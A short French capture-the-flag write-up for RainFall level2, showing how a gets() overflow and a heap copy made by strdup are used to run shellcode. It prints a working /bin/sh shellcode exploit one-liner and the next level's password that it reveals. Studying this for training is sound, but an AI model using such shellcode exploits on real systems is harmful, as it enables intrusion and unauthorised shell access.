Nous remarquons que le programme utilise gets, une fonction vulnérable aux overflow. Nous remarquons aussi qu'il vérifie que l'adresse de retour se situe dans la heap.
Il se trouve qu'il y a la fonction strdup, on peut donc se servir de ltrace afin de savoir où l'adresse de la valeur de retour de strdup.

```bash
level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                    = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)                         = 0xbffff6fc
puts("")                                                              = 1
strdup("")                                                            = 0x0804a008
```
Ensuite, nous insèrons un shellcode à cette adresse `0x0804a008`, puis l'on overflow gets afin de modifier l'adresse de retour du main pour qu'il redirige à l'endroit de notre shellcode.

```bash
level2@RainFall:~$ (python -c 'print "\x99\x6A\x0B\x58\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\xCD\x80" + "a" * 62 + "\x08\xa0\x04\x08"'; cat) | ./level2
�j
  Xhn/shh//bi��̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�aaaaaaaaaaa�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
